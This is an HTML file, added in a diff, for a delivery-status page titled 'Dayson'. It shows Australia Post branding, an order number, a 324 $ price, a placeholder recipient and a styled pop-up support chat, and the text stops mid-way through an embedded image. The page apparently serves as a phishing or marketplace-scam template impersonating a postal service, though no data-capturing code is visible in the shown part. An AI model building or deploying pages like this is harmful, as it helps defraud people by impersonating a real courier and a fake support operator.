@@ -1,0 +1,1155 @@
+<html lang="en">
+ <head> 
+  <link rel="stylesheet" href="/css/support_parent.css"> 
+  <style type="text/css">
+    .chat {
+        border: 1px solid #333;
+        margin: 15px;
+        width: 40%;
+        height: 70%;
+        background: #555;
+        color: #fff;
+    }
+
+    .chat-messages {
+        min-height: 93%;
+        max-height: 93%;
+        overflow: auto;
+    }
+
+    .chat-messages__content {
+        padding: 1px;
+    }
+
+    .chat__message {
+        border-left: 3px solid #333;
+        margin-top: 2px;
+        padding: 2px;
+    }
+
+    .chat__message_black {
+        border-color: #000;
+    }
+
+    .chat__message_blue {
+        border-color: #002f34;
+    }
+
+    .chat__message_green {
+        border-color: green;
+    }
+
+    .chat__message_red {
+        border-color: red;
+    }
+
+    .chat-input {
+        min-height: 6%;
+    }
+
+
+    .chat-form__input {
+        width: 100%;
+    }
+
+    .chat-form__submit {
+        width: 18%;
+    }
+
+        {
+        box-sizing: border-box;
+    }
+
+    .msg_chat {
+        color: white !important;
+        word-break: break-word !important;
+        margin-bottom: 23px !important;
+    }
+
+    .msg_chat1 {
+        color: black !important;
+
+        word-break: break-word !important;
+        margin-bottom: 23px !important;
+    }
+
+    /* Кнопка, используемая для открытия контактной формы - фиксируется в нижней части страницы */
+    .open-button {
+        display: none !important;
+    }
+
+    .open-button2 {
+        background-color: #1D766F;
+        margin-bottom: 2%;
+        font-size: 1em;
+        font-weight: 1000;
+        border-radius: 10px 20px 10px 20px;
+        color: white;
+        padding: 16px 20px;
+        border: none;
+        cursor: pointer;
+        bottom: 90px;
+        z-index: 999;
+        opacity: 0.8;
+        position: fixed;
+        bottom: 0px;
+        right: 28px;
+        width: 140px;
+        border-radius: 50%;
+        width: 70px;
+        height: 70px;
+        background-image: url("chat/2.png");
+        background-repeat: no-repeat;
+        background-position: center;
+    }
+
+    /* Всплывающая форма-скрыта по умолчанию */
+    .form-popup {
+
+        display: none;
+        position: fixed;
+        bottom: 0;
+        right: 15px;
+        /*border: 3px solid #f1f1f1;*/
+        z-index: 900000000;
+    }
+
+    .form-content {
+        display: block;
+        height: 400px !important;
+        overflow-y: auto !important;
+        scrollbar-width: none !important;
+        padding: 10px !important;
+    }
+
+    ::-webkit-scrollbar {
+        width: 0px;
+    }
+
+    /* Добавить стили для контейнера формы */
+    .form-chat-container {
+        max-width: 340px;
+        min-height: 400px;
+        background-color: white;
+        float: right;
+        box-shadow: 0 0 60px 3px rgba(0, 0, 0, 0.3);
+        border-radius: 5px;
+    }
+
+    .chat-header {
+        background: #1D766F;
+        z-index: 999;
+        color: white;
+        border-radius: 5px;
+        padding: 5px;
+        height: 250px;
+    }
+
+    .chat-title,
+    .chat-close {
+        margin-left: 10px;
+        display: inline;
+        margin-top: -188px;
+    }
+
+    .chat-close {
+        float: right;
+    }
+
+    .chat-footer {
+        display: inline-block;
+    }
+
+    /* Поля ввода полной ширины */
+    .form-chat-container input[type=text],
+    .form-chat-container input[type=password] {
+        color: black;
+        width: 90% !important;
+        padding-left: 5px;
+        margin-bottom: 2px;
+        height: 45px;
+        border: none;
+        display: inline;
+    }
+
+
+    /* Установите стиль для кнопки отправить/войти */
+    .form-chat-container .chat-btn {
+        border: 0px;
+        color: white;
+        padding: 20px;
+        height: 45px;
+        cursor: pointer;
+        width: 15%;
+        margin-top: 15px;
+        opacity: 0.8;
+        border-radius: 5px;
+        margin-left: 1%;
+        display: inline;
+        background-color: #fff;
+        background-image: url('chat/send_btn1.png');
+        background-size: contain;
+        background-repeat: no-repeat;
+    }
+
+    /* Добавить красный цвет фона для кнопки "Отмена" */
+    .form-chat-container .cancel {
+        background-color: red;
+    }
+
+    /* Добавить некоторые эффекты наведения на кнопки */
+    .form-chat-container .chat-btn:hover,
+    .open-button2:hover {
+        box-shadow: 0 0 30px 5px rgba(0, 0, 0, 0.5);
+    }
+
+    /* Chat containers */
+    .container_message {
+        position: relative !important;
+        background-color: #e8ecef !important;
+        border-radius: 9px !important;
+        padding: 10px !important;
+        margin: 10px 0 !important;
+        margin-left: 0px !important;
+        display: flex !important;
+        justify-content: right !important;
+        flex: 0 0 auto !important;
+
+        /*margin-left: 160px;*/
+        min-height: 25px !important;
+    }
+
+    /* Darker chat container */
+    .darker {
+        border-color: #ccc;
+        background-color: #002f34;
+        min-height: 45px;
+        display: flex;
+        justify-content: left;
+        margin-left: 0;
+        /*width: 50%;*/
+        padding: 10px;
+    }
+
+    /* Clear floats */
+    .container_message::after {
+        content: "";
+        clear: both;
+        display: table;
+    }
+
+    /* Style images */
+    .container_message img {
+        max-width: 50px;
+        float: left;
+        max-width: 60px;
+        width: 100%;
+        margin-right: 20px;
+        border-radius: 5px;
+    }
+
+    /* Style the right image */
+    .container_message img.right {
+        float: right;
+        max-width: 50px;
+        margin-left: 20px;
+        margin-right: 0;
+    }
+
+    /* Style time text */
+    .container_message .time-right {
+        position: absolute;
+        left: 5px;
+        bottom: 0;
+        float: left;
+        color: #aaa;
+    }
+
+    /* Style time text */
+    .container_message .time-left {
+        position: absolute;
+        left: 5px;
+        bottom: 0;
+        float: left;
+        width: 100%;
+        color: #fff;
+    }
+
+    .close {
+        float: right;
+        width: 16px;
+        height: 16px;
+        opacity: 0.4;
+    }
+
+    .close:hover {
+        opacity: 1;
+    }
+
+    .close:before,
+    .close:after {
+        position: absolute;
+        content: ' ';
+        height: 23px;
+        width: 3px;
+        background-color: #fff;
+        top: 10px;
+    }
+
+    .close:before {
+        transform: rotate(45deg);
+    }
+
+    .close:after {
+        transform: rotate(-45deg);
+    }
+
+    .operator-face {
+        height: 100%;
+        margin-bottom: -170px;
+    }
+
+    .photo {
+        background-image: url("./serviceicon.png");
+        background-size: 80px 80px;
+        height: 80px;
+        background-repeat: no-repeat;
+        background-position: center;
+        width: 80px;
+        margin-left: 130px;
+        margin-top: 30px;
+        margin-bottom: 10px;
+
+    }
+
+    .team {
+        text-align: center;
+        font-size: 16px;
+        color: #fff;
+        font-family: "proxima-nova", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        font-weight: 400;
+    }
+
+
+
+    .activity-indicator {
+        text-align: center;
+        font-size: 13px;
+        color: #DFD7D2;
+        font-family: "proxima-nova", "Helvetica Neue", Helvetica, Arial, sans-serif;
+    }
+
+    .welcome-message {
+        margin-top: 20px;
+        font-weight: 400;
+        padding: 0 20px;
+        text-align: center;
+        font-size: 14px;
+        line-height: 1.32em;
+        color: #fff;
+        box-shadow: none;
+        box-sizing: border-box;
+        caption-side: top;
+        word-break: normal;
+        word-spacing: normal;
+        word-wrap: normal;
+    }
+
+    .message-time {
+        position: absolute;
+        right: 15px;
+        float: left;
+        color: #fff;
+    }
+
+    button:active,
+    button:focus {
+        outline: none;
+    }
+
+    button::-moz-focus-inner {
+        border: 0;
+    }
+
+    input {
+        outline: none;
+    }
+
+    @media screen and (max-height: 800px) {
+        .form-content {
+            height: 250px !important;
+        }
+    }
+</style> 
+  <meta charset="UTF-8"> 
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>
+        Dayson
+    </title> 
+  <link rel="shortcut icon" href="https://cdn-icons-png.flaticon.com/128/3496/3496155.png" type="image/x-icon"> 
+  <style type="text/css">
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Droid Sans,
+                Helvetica Neue, sans-serif;
+            color: #2c2c2d;
+        }
+
+        .container {
+            max-width: 1325px;
+            padding: 0 15px;
+            width: 100%;
+            margin: 0 auto;
+            display: flex;
+        }
+
+        .logo {
+            height: 32px;
+            margin-right: 24px;
+        }
+
+        .h_l {
+            display: flex;
+            align-items: center;
+        }
+
+        .menu {
+            position: relative;
+        }
+
+        .menu_hiden {
+            position: absolute;
+        }
+
+        .menu_title {
+            padding: 0 16px;
+            height: 47px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .menu_title:hover {
+            background-color: #f0f1f1;
+        }
+
+        .menu_hiden {
+            background-color: #fff;
+            border: 1px solid #f0f1f1;
+            border-bottom-left-radius: 4px;
+            border-bottom-right-radius: 4px;
+            border-top: none;
+            box-shadow: 0 8px 13px 0 rgba(44, 44, 45, 0.27);
+            min-width: 140px;
+            width: fit-content;
+            padding: 4px 0;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .menu_hiden a {
+            height: 40px;
+            text-decoration: none;
+            font-size: 16px;
+            padding: 0 16px;
+            width: 100%;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+        }
+
+        .menu_hiden a:hover {
+            background-color: #f0f1f1;
+        }
+
+        .menu:hover .menu_hiden {
+            display: flex !important;
+        }
+
+        .M_aaX {
+            margin-right: 8px;
+        }
+
+        .semi {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .h_r {
+            display: flex;
+            align-items: center;
+        }
+
+        .sell {
+            height: 32px;
+            color: #fff;
+            background-color: #dc1928;
+            padding: 0 24px;
+            font-size: 16px;
+            border-radius: 4px;
+        }
+
+        .sell:hover {
+            background-color: #dc1928;
+        }
+
+        .sb {
+            justify-content: space-between;
+        }
+
+        .mel {
+            margin-left: 12px;
+        }
+
+        .h_top {
+            border-bottom: 1px solid #f0f1f1;
+        }
+
+        .inp {
+            width: 100%;
+            position: relative;
+        }
+
+        .search {
+            height: 44px;
+            padding: 0 16px;
+            background-color: #f0f1f1;
+            border-top-left-radius: 4px;
+            border-bottom-left-radius: 4px;
+            width: 100%;
+            border: 1px solid transparent;
+            outline: none;
+            position: relative;
+            z-index: 1;
+            padding-left: 40px;
+            font-size: 16px;
+        }
+
+        .search:focus {
+            border: 1px solid #008f79;
+            box-shadow: 0 0 0 4px #cce9e4;
+        }
+
+        .search::placeholder {
+            font-size: 16px;
+            color: #c5c5c6;
+        }
+
+        .h_bot {
+            padding: 6px 0;
+            border-bottom: 1px solid #f0f1f1;
+        }
+
+        .inp svg,
+        .inp img {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            height: 16px;
+            z-index: 3333;
+            left: 16px;
+        }
+
+        .mw {
+            max-width: 320px;
+        }
+
+        .gap {
+            gap: 2px;
+        }
+
+        .loc::placeholder {
+            color: #2c2c2d;
+        }
+
+        .kol {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            z-index: 333;
+            right: 3px;
+        }
+
+        .sear {
+            height: 36px;
+            background-color: #008f79;
+            color: #fff;
+            border-radius: 4px;
+            font-size: 16px;
+            padding: 0 12px;
+        }
+
+        .sear:hover {
+            background-color: #026958;
+        }
+
+        .loc {
+            border-radius: 0;
+            border-bottom-right-radius: 4px;
+            border-top-right-radius: 4px;
+        }
+
+        header {
+            margin-bottom: 30px;
+        }
+
+        .image {
+            overflow: hidden;
+            border: 1px solid transparent;
+            border-radius: 12px;
+            height: 344px;
+            position: relative;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        .fon {
+            position: absolute;
+            height: 344px;
+            left: 0;
+            -o-object-fit: cover;
+            object-fit: cover;
+            top: 0;
+            width: 100%;
+            z-index: 2;
+        }
+
+        .fil {
+            backdrop-filter: blur(64px);
+            background: rgba(44, 44, 45, .27);
+            width: 100%;
+            position: absolute;
+            z-index: 3;
+            height: 100%;
+        }
+
+        .img_box {
+            position: relative;
+            z-index: 10;
+            display: flex;
+            height: 100%;
+        }
+
+        .img_box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            inset: 0px;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .img_box img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        picture {
+            position: absolute;
+            inset: 0px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .rr {
+            display: block;
+        }
+
+        .name {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .price {
+            font-size: 30px;
+            font-weight: 600;
+        }
+
+        .info {
+            display: flex;
+            margin-top: 16px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid #f0f1f1;
+            margin-bottom: 24px;
+        }
+
+        .i_el {
+            display: flex;
+            width: 33%;
+        }
+
+        .i_el img {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+        }
+
+        .m {
+            margin-bottom: 8px;
+        }
+
+        .rows {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px 24px;
+            margin-bottom: 24px;
+        }
+
+        .row {
+            width: calc(33% - 16px)
+        }
+
+        .r_name {
+            font-size: 14px;
+            color: #57585A;
+            margin-bottom: 3px;
+        }
+
+        .r_val {
+            font-size: 16px;
+            color: #57585A;
+        }
+
+        .main_box {
+            margin-right: 24px;
+            width: 100%;
+        }
+
+        .two {
+            display: flex;
+            align-items: flex-start;
+        }
+
+        .ap_box {
+            width: 100%;
+            max-width: 340px;
+            border-radius: 8px;
+            box-shadow: 0 3px 10px 0 rgb(44 44 45 / 7%), inset 0 0 0 1px rgb(44 44 45 / 7%);
+            padding: 20px 24px;
+        }
+
+        .sotka {
+            width: 100%;
+        }
+
+        .sert {
+            background-color: #fff;
+            border: 1px solid #f0f1f1;
+            border-radius: 8px;
+            padding: 16px;
+            width: fit-content;
+            display: flex;
+            margin-bottom: 40px;
+        }
+
+        .sert img {
+            margin-right: 16px;
+        }
+
+        .s_z {
+            font-size: 16px;
+            font-weight: 600;
+            color: #57585A;
+        }
+
+        .s_t {
+            color: #57585A;
+            font-size: 14px;
+        }
+
+        .fot {
+            border-top: 1px dashed rgba(44, 44, 45, .27);
+            padding-top: 40px;
+        }
+
+        header {
+            position: fixed;
+            width: 100%;
+            z-index: 999999999;
+            background-color: #fff;
+            margin-bottom: 0;
+        }
+
+        main {
+            padding-top: 60px;
+        }
+
+        .fot_top {
+            display: flex;
+            max-width: 1272px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .fot_elems {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+        }
+
+        .fot_elem {
+            display: flex;
+            flex-direction: column;
+            min-height: 164px;
+            margin-bottom: 16px;
+
+        }
+
+        .fot_zag {
+            font-size: 12px;
+            font-weight: 600;
+            color: #2C2C2D;
+            height: 20px;
+        }
+
+        .fot_elem a {
+            font-size: 12px;
+            text-decoration: none;
+            min-height: 20px;
+        }
+
+        .fot_elem a:hover {
+            text-decoration: underline;
+            color: #008F79 !important;
+        }
+
+        .fot_elem a p {
+            color: #57585A
+        }
+
+        .fot_elem a:hover p {
+            color: #008F79 !important;
+        }
+
+        .mel {
+            margin-left: 16px;
+        }
+
+        .fot_top {
+            margin-bottom: 24px;
+        }
+
+        .fot_bot {
+            border-top: 1px solid #f0f1f1;
+            padding: 24px 0;
+            display: flex;
+            max-width: 1272px;
+            margin: 0 auto;
+            width: 100%;
+            align-items: center;
+        }
+
+        .pop {
+            display: flex;
+            align-items: center;
+            font-size: 12px;
+            color: #57585A;
+            margin-right: 24px;
+        }
+
+        .pop svg {
+            margin-right: 8px;
+        }
+
+        .D_RF {
+            display: flex;
+            align-items: center;
+            font-size: 12px;
+        }
+
+        .D_RF a,
+        .D_RF p {
+            font-size: 12px;
+            color: #57585A;
+            text-decoration: none;
+        }
+
+        .D_RF a:hover {
+            text-decoration: underline;
+            color: #008F79;
+        }
+
+        .D_RF a:hover p {
+            text-decoration: underline;
+            color: #008F79;
+        }
+
+        .des {
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .kk {
+            color: #57585A;
+            margin-bottom: 8px;
+        }
+
+        .submit {
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            height: 40px;
+            font-weight: 600;
+        }
+
+        .type {
+            display: flex;
+            margin-bottom: 10px;
+        }
+
+        .type img {
+            height: 30px;
+            margin-right: 10px;
+        }
+
+        @media (max-width:1260px) {
+            .menu_title svg {
+                display: none;
+            }
+
+            .menu_title {
+                padding: 0 8px;
+            }
+        }
+
+        @media (max-width:800px) {
+            .menu {
+                display: none;
+            }
+
+            .h_bot {
+                display: none;
+            }
+
+            .logo {
+                margin-right: 0;
+            }
+
+            header .container {
+                justify-content: center;
+                padding: 0;
+                height: 60px;
+            }
+
+            footer {
+                display: none;
+            }
+
+            .ap_box {
+                position: fixed;
+                background-color: #fff;
+                border-radius: 0;
+                left: 0;
+                right: 0;
+                max-width: none;
+                bottom: 0;
+            }
+
+            .pok {
+                display: flex;
+            }
+
+            .it {
+                margin-right: 24px;
+            }
+
+            .type img {
+                height: 24px;
+            }
+
+            main {
+                padding-top: 61px;
+                padding-bottom: 110px;
+            }
+
+            .image {
+                border-radius: 0;
+            }
+
+            .main_box {
+                margin-right: 0;
+            }
+
+            .info {
+                flex-wrap: wrap;
+                gap: 15px 0;
+            }
+
+            .i_el {
+                width: 50%;
+            }
+
+            .ap_box {
+                padding: 15px;
+            }
+
+            .semi {
+                display: block !important;
+                position: absolute;
+                right: 5px;
+            }
+
+            .semi .menu_title {
+                color: #008f79;
+            }
+
+            .rr {
+                padding: 0;
+            }
+
+            .two {
+                padding: 0 15px;
+            }
+        }
+    </style> 
+ </head> 
+ <body> 
+  <header> 
+   <div class="h_top"> 
+    <div class="container sb"> 
+     <div class="h_l"> 
+      <img class="logo" src="https://static.wikia.nocookie.net/logopedia/images/8/8d/AustraliaPost_2019-hori.svg" alt="" srcset=""> 
+     </div> 
+     <div class="h_r"> 
+      <div class="menu"> 
+       <div class="menu_title semi">
+         #192529707 
+       </div> 
+      </div> 
+     </div> 
+    </div> 
+   </div> 
+  </header> 
+  <main> 
+   <div class="container rr"> 
+    <div class="image"> 
+     <div class="filter"> 
+      <img class="fon" src="Без названия61_20230731130022.png" alt="Dayson"> 
+      </picture> 
+     </div> 
+    </div> 
+    <div class="two"> 
+     <div class="main_box"> 
+      <div class="name">
+        Dayson 
+      </div> 
+      <div class="price">
+        324 $ 
+      </div> 
+      <div class="info"> 
+       <div class="i_el"> 
+        <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxzdmcgd2lkdGg9IjE2cHgiIGhlaWdodD0iMTZweCIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPg0KICAgIDwhLS0gR2VuZXJhdG9yOiBTa2V0Y2ggNTYuMiAoODE2NzIpIC0gaHR0cHM6Ly9za2V0Y2guY29tIC0tPg0KICAgIDx0aXRsZT5TeXN0ZW0gSWNvbnMvTGlzdGluZyAvIGNvbmRpdGlvbiAvIDE2X2NvbmRpdGlvbjwvdGl0bGU+DQogICAgPGRlc2M+Q3JlYXRlZCB3aXRoIFNrZXRjaC48L2Rlc2M+DQogICAgPGcgaWQ9IlN5c3RlbS1JY29ucy9MaXN0aW5nLS8tY29uZGl0aW9uLS8tMTZfY29uZGl0aW9uIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4NCiAgICAgICAgPHBhdGggZD0iTTgsMi41IEwzLDIuNSBDMi43MjM4NTc2MywyLjUgMi41LDIuNzIzODU3NjMgMi41LDMgTDIuNSwxMyBDMi41LDEzLjI3NjE0MjQgMi43MjM4NTc2MywxMy41IDMsMTMuNSBMMTMsMTMuNSBDMTMuMjc2MTQyNCwxMy41IDEzLjUsMTMuMjc2MTQyNCAxMy41LDEzIEwxMy41LDggQzEzLjUsNy43MjM4NTc2MyAxMy43MjM4NTc2LDcuNSAxNCw3LjUgQzE0LjI3NjE0MjQsNy41IDE0LjUsNy43MjM4NTc2MyAxNC41LDggTDE0LjUsMTMgQzE0LjUsMTMuODI4NDI3MSAxMy44Mjg0MjcxLDE0LjUgMTMsMTQuNSBMMywxNC41IEMyLjE3MTU3Mjg4LDE0LjUgMS41LDEzLjgyODQyNzEgMS41LDEzIEwxLjUsMyBDMS41LDIuMTcxNTcyODggMi4xNzE1NzI4OCwxLjUgMywxLjUgTDgsMS41IEM4LjI3NjE0MjM3LDEuNSA4LjUsMS43MjM4NTc2MyA4LjUsMiBDOC41LDIuMjc2MTQyMzcgOC4yNzYxNDIzNywyLjUgOCwyLjUgWiBNMTIuNSw2IEMxMS4xMTkyODgxLDYgMTAsNC44ODA3MTE4NyAxMCwzLjUgQzEwLDIuMTE5Mjg4MTMgMTEuMTE5Mjg4MSwxIDEyLjUsMSBDMTMuODgwNzExOSwxIDE1LDIuMTE5Mjg4MTMgMTUsMy41IEMxNSw0Ljg4MDcxMTg3IDEzLjg4MDcxMTksNiAxMi41LDYgWiBNMTIuNSw1IEMxMy4zMjg0MjcxLDUgMTQsNC4zMjg0MjcxMiAxNCwzLjUgQzE0LDIuNjcxNTcyODggMTMuMzI4NDI3MSwyIDEyLjUsMiBDMTEuNjcxNTcyOSwyIDExLDIuNjcxNTcyODggMTEsMy41IEMxMSw0LjMyODQyNzEyIDExLjY3MTU3MjksNSAxMi41LDUgWiIgaWQ9IkNvbWJpbmVkLVNoYXBlIiBmaWxsPSIjMkMyQzJEIiBmaWxsLXJ1bGU9Im5vbnplcm8iLz4NCiAgICA8L2c+DQo8L3N2Zz4=" alt="" srcset=""> New/Well used 
+       </div> 
+       <div class="i_el"> 
+        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNNCAxNUM1LjEwNDU3IDE1IDYgMTQuMTA0NiA2IDEzSDEwQzEwIDE0LjEwNDUgMTAuODk1NCAxNSAxMiAxNUMxMy4xMDQ2IDE1IDE0IDE0LjEwNDYgMTQgMTNDMTUuMTA0NiAxMyAxNiAxMi4xMDQ1IDE2IDExVjguNTAxNzhMMTYgOC41TDE2IDguNDk4MjJWOC4xNzUyNEMxNiA3Ljk0MDAzIDE1Ljk1ODUgNy43MDY2NyAxNS44Nzc1IDcuNDg1ODdDMTQuMzE1NCAzLjIzMzU2IDExLjY1NzIgMSA4IDFIMkMwLjg5NTQzIDEgMCAxLjg5NTQzIDAgM1YzLjVDMCAzLjc3NjE0IDAuMjIzODU4IDQgMC41IDRDMC43NzYxNDIgNCAxIDMuNzc2MTQgMSAzLjVWM0MxIDIuNDQ3NzIgMS40NDc3MiAyIDIgMkg4QzExLjE5NzkgMiAxMy41MTA4IDMuOTQzNDcgMTQuOTM4NyA3LjgzMDQxQzE0Ljk1OSA3Ljg4NTYgMTQuOTc0MyA3Ljk0MjM1IDE0Ljk4NDUgOEgxMS41QzEwLjY3MTYgOCAxMCA3LjMyODQzIDEwIDYuNVY1QzEwIDQuNzIzODYgOS43NzYxNCA0LjUgOS41IDQuNUM5LjIyMzg2IDQuNSA5IDQuNzIzODYgOSA1VjYuNUM5IDcuODgwNzEgMTAuMTE5MyA5IDExLjUgOUgxNVYxMUMxNSAxMS41NTIzIDE0LjU1MjMgMTIgMTQgMTJIMTMuNzMyNEMxMy4zODY2IDExLjQwMjIgMTIuNzQwMyAxMSAxMiAxMUMxMS4yNTk3IDExIDEwLjYxMzQgMTEuNDAyMiAxMC4yNjc2IDEySDUuNzMyNDJDNS4zODY2MSAxMS40MDIyIDQuNzQwMjcgMTEgNCAxMUMzLjI1OTcyIDExIDIuNjEzMzkgMTEuNDAyMiAyLjI2NzU4IDEySDJDMS40NDc3MiAxMiAxIDExLjU1MjMgMSAxMVYxMC41QzEgMTAuMjIzOSAwLjc3NjE0NSA5Ljk5OTk5IDAuNSA5Ljk5OTk4QzAuMjIzODY3IDkuOTk5OTggMCAxMC4yMjM4IDAgMTAuNVYxMUMwIDEyLjEwNDUgMC44OTU0MjkgMTMgMiAxM0MyIDE0LjEwNDYgMi44OTU0MyAxNSA0IDE1Wk00IDEyQzQuNTUyMjggMTIgNSAxMi40NDc3IDUgMTNDNSAxMy41NTIzIDQuNTUyMjggMTQgNCAxNEMzLjQ0NzcyIDE0IDMuMDAwMDEgMTMuNTUyMyAzIDEzQzMgMTIuNDQ3NyAzLjQ0NzcyIDEyIDQgMTJaTTEyIDE0QzEyLjU1MjMgMTQgMTMgMTMuNTUyMyAxMyAxM0MxMyAxMi40NDc3IDEyLjU1MjMgMTIgMTIgMTJDMTEuNDQ3NyAxMiAxMSAxMi40NDc3IDExIDEzQzExIDEzLjU1MjMgMTEuNDQ3NyAxNCAxMiAxNFoiIGZpbGw9IiM2RDZFNzEiLz4NCjxwYXRoIGQ9Ik0yLjUgNUgzLjVDMy43NzYxNCA1IDQgNS4yMjM4NiA0IDUuNUM0IDUuNzc2MTQgMy43NzYxNCA2IDMuNSA2SDIuNUMyLjIyMzg2IDYgMiA1Ljc3NjE0IDIgNS41QzIgNS4yMjM4NiAyLjIyMzg2IDUgMi41IDVaIiBmaWxsPSIjNkQ2RTcxIi8+DQo8cGF0aCBkPSJNNC41IDdDNC43NzYxNCA3IDUgNy4yMjM4NiA1IDcuNUM1IDcuNzc2MTQgNC43NzYxNCA4IDQuNSA4SDAuNUMwLjIyMzg1OCA4IDAgNy43NzYxNCAwIDcuNUMwIDcuMjIzODYgMC4yMjM4NTggNyAwLjUgN0g0LjVaIiBmaWxsPSIjNkQ2RTcxIi8+DQo8L3N2Zz4=" alt="" srcset=""> Delivery 
+       </div> 
+      </div> 
+      <div class="name m">
+       Product information
+      </div> 
+      <div class="rows"> 
+       <div class="row"> 
+        <div class="r_name">
+         Price
+        </div> 
+        <div class="r_val">
+          324 $ 
+        </div> 
+       </div> 
+       <div class="row"> 
+        <div class="r_name">
+         Quantity
+        </div> 
+        <div class="r_val">
+         1
+        </div> 
+       </div> 
+       <div class="row"> 
+        <div class="r_name">
+         Condition
+        </div> 
+        <div class="r_val">
+         New/Well used
+        </div> 
+       </div> 
+      </div> 
+      <div class="name m">
+       Delivery information
+      </div> 
+      <div class="rows"> 
+       <div class="row sotka"> 
+        <div class="r_name">
+         Recipient
+        </div> 
+        <div class="r_val">
+          John Smith, Merry Line 12222 
+        </div> 
+       </div> 
+      </div> 
+      <div class="sert"> 
+       <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCjxnIGNsaXAtcGF0aD0idXJsKCNjbGlwMCkiPg0KPHBhdGggZD0iTTMwLjQxODMgMTYuMTI2QzMwLjQ0MTIgMTUuNTMwNCAzMC44NzY0IDE0LjQ1MzggMzEuMzM0NiAxMy4zMDg1QzMxLjc5MjcgMTIuMTg2MSAzMi4yOTY2IDEwLjkyNjMgMzEuNzY5OCA5LjYyMDYyQzMxLjI0MjkgOC4zMTQ5NiAzMC4wMDYgNy43NjUyMSAyOC43MDAzIDcuMTkyNTZDMjcuNjIzOCA2LjY4ODYyIDI2LjY4NDYgNi4yNzYzMSAyNi4yNzIzIDUuODg2OUMyNS44NiA1LjQ1MTY4IDI1LjQyNDggNC4zNzUwOSAyNC45NDM3IDMuMjI5NzhDMjQuNDYyNyAyLjEzMDI4IDIzLjkzNTkgMC44OTMzNDMgMjIuNjMwMiAwLjM0MzU5M0MyMi4yNDA4IDAuMTYwMzQ0IDIxLjgyODUgMC4wOTE2MjQ5IDIxLjM5MzMgMC4wOTE2MjQ5QzIwLjUyMjggMC4wOTE2MjQ5IDE5LjY3NTMgMC40MTIzMTIgMTguOTQyMyAwLjcxMDA5M0wxOC41NzU4IDAuODQ3NTNDMTcuNTQ1IDEuMjM2OTQgMTYuNjUxNyAxLjU4MDUzIDE2LjEwMTkgMS41ODA1M0MxNS41NTIyIDEuNTU3NjIgMTQuNjM1OSAxLjE5MTEyIDEzLjU4MjIgMC43NTU5MDZMMTMuMzA3NCAwLjY0MTM3NEMxMi41OTczIDAuMzY2NSAxMS43MDM5IDAgMTAuNjI3MyAwSDEwLjU4MTVDMTAuMjM3OSAwLjA0NTgxMjUgOS45MTcyNCAwLjExNDUzMSA5LjYxOTQ2IDAuMjI5MDYyQzguMjkwOSAwLjc3ODgxMiA3Ljc0MTE1IDEuOTkyODQgNy4xNjg0OSAzLjI5ODVMNy4yNjAxMiAzLjM0NDMxTDcuMTY4NDkgMy4zMjE0QzYuNjg3NDYgNC4zOTggNi4yNzUxNSA1LjMxNDI0IDUuODYyODQgNS43MjY1NkM1LjQ5NjM0IDYuMDkzMDYgNC42NDg4MSA2LjQzNjY1IDMuNjYzODQgNi44NzE4N0wzLjI1MTUzIDcuMDU1MTJDMi4xOTc4NCA3LjQ5MDM0IDAuODY5MjgxIDguMDQwMDkgMC4zMTk1MzIgOS4zNjg2NUMtMC4yMzAyMTggMTAuNjUxNCAwLjI3MzcxOSAxMS45MzQxIDAuNzA4OTM3IDEzLjA3OTVMMC44MDA1NjIgMTMuMzU0M0MxLjE4OTk3IDE0LjM2MjIgMS41NzkzNyAxNS4zMjQzIDEuNTU2NDcgMTUuODk2OUMxLjU1NjQ3IDE2LjQ0NjcgMS4xODk5NyAxNy4zODU4IDAuNzMxODQ0IDE4LjQ2MjRMMC42NDAyMTkgMTguNjkxNUMwLjIwNSAxOS43OTEgLTAuMzIxODQzIDIxLjA1MDggMC4yMjc5MDcgMjIuMzc5NEMwLjc1NDc1IDIzLjcwNzkgMi4wMzc1IDI0LjI4MDYgMy4xNTk5IDI0Ljc4